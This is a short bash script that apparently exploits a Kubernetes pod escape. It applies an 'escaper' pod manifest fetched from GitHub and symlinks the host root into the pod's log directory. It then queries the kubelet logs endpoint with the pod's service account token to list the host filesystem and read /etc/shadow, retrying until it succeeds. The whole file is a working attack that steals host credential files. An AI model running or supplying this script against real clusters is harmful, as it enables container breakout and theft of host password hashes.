#!/bin/bash

while [ 1 -lt 2 ]
do
    # Deploy escaper pod
    kubectl apply -f https://raw.githubusercontent.com/danielsagi/kube-pod-escape/master/escaper.yml

    # Execute commands inside the escaper pod
    listing=$(kubectl exec -it escaper -- bash -c '
        ln -s / /var/log/host/root_link
        curl https://$(/sbin/ip route | awk "/default/ { print \$3 }"):10250/logs/root_link/ -k -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)"
        curl https://$(/sbin/ip route | awk "/default/ { print \$3 }"):10250/logs/root_link/etc/shadow -k -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)"
    ')

    # Print the content of the listing variable
    echo "Output from the escaper pod: $listing"

    # Check if listing is empty
    if [ "$listing" = "" ]
    then
        echo 'Fail. Commands inside the escaper pod were unsuccessful. Retrying...';
    else
        echo 'Success! Commands inside the escaper pod were successful.';
        exit;
    fi

    # Add a delay before retrying (adjust as needed)
    sleep 10
done
